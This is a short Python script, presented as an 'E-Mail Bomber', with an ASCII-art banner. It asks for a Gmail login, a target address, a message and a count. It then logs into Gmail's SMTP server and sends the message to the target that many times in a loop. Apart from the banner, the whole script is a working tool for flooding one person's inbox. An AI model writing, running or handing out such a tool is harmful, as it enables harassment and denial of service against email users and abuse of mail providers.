import smtplib
import os
os.system("clear")
color_off="\033[0m"       # Text Reset
black="\033[0;30m"        # Black
red="\033[0;31m"          # Red
green="\033[0;32m"        # Green
yellow="\033[0;33m"       # Yellow
blue="\033[0;34m"         # Blue
purple="\033[0;35m"       # Purple
cyan="\033[0;36m"         # Cyan
white="\033[0;37m"        # White

print(green+"""

    :~-._                                                 _.-~:
    : :.~^o._        ________---------________        _.o^~.:.:
     : ::.`?88booo~~~.::::::::...::::::::::::..~~oood88P'.::.:
     :  ::: `?88P .:::....         ........:::::. ?88P' :::. :
      :  :::. `? .::.            . ...........:::. P' .:::. :
       :  :::   ... ..  ...       .. .::::......::.   :::. :
       `  :' .... ..  .:::::.     . ..:::::::....:::.  `: .'
        :..    ____:::::::::.  . . ....:::::::::____  ... :
       :... `:~    ^~-:::::..  .........:::::-~^    ~::.::::
       `.::. `\   (8)  \b:::..::.:.:::::::d/  (8)   /'.::::'
        ::::.  ~-._v    |b.::::::::::::::d|    v_.-~..:::::
        `.:::::... ~~^?888b..:::::::::::d888P^~...::::::::'
         `.::::::::::....~~~ .:::::::::~~~:::::::::::::::'
          `..:::::::::::   .   ....::::    ::::::::::::,'
            `. .:::::::    .      .::::.    ::::::::'.'
              `._ .:::    .        :::::.    :::::_.'
                 `-. :    .        :::::      :,-'
                    :.   :___     .:::___   .::
          ..--~~~~--:+::. ~~^?b..:::dP^~~.::++:--~~~~--..
            ___....--`+:::.    `~8~'    .:::+'--....___
          ~~   __..---`_=:: ___gd8bg___ :==_'---..__   ~~
           -~~~  _.--~~`-.~~~~~~~~~~~~~~~,-' ~~--._ ~~~-
              -~~            ~~~~~~~~~   _ Seal _  ~~-
""")
print(red+"""
                Developed By : ASHRAF UDDIN

                ★★ D P E-Mail Bomber ★★                
""")
print(yellow+"""""")
rocx=smtplib.SMTP('smtp.gmail.com','587')

rocx.ehlo()
rocx.starttls()

email=str(input("Enter Your Gmail : "))
pwd=str(input ("Enter Your Password: "))          
tmail=str(input("Enter Your Target E-Mail : "))
msg=str(input("Enter Your Message: "))
amount=int(input("Enter Your Amount: "))

rocx.login(email,pwd)

for i in range(amount):
   rocx.sendmail(email,tmail,msg)
